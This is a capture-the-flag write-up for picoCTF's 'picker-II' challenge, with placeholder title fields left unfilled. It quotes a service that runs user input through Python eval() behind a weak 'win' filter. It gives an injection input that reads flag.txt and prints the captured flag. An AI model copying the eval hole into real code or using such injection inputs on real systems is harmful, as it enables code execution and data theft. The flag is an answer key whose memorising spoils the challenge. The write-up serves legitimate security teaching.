
# \<The challenge title\>

*\<Difficulty\>*

>### Description
>Can you figure out how this program works to get the flag?
Connect to the program with netcat:
>```sh
> nc saturn.picoctf.net 65333
>```
>The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/522/picker-II.py).

### Solution

The source contains a lot of useless code and comments. But the import thing is the main loop, same as previous challenge. But this time it filters user input very basic.

```python
def filter(user_input):
  if 'win' in user_input:
    return False
  return True

while(True):
  try:
    user_input = input('==> ')
    if( filter(user_input) ):
      eval(user_input + '()')
    else:
      print('Illegal input')
  except Exception as e:
    print(e)
    break
```

Our input is invalid if we use 'win', so we cannot just straightup call win(). But since our input just get parsed as python code. We can simply read the flag file and print it as our input.

```python
print(open('flag.txt', 'r').read())#
```

<details>
<summary>Yes! We got the flag:</summary> 
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_0b5f1131}
</details>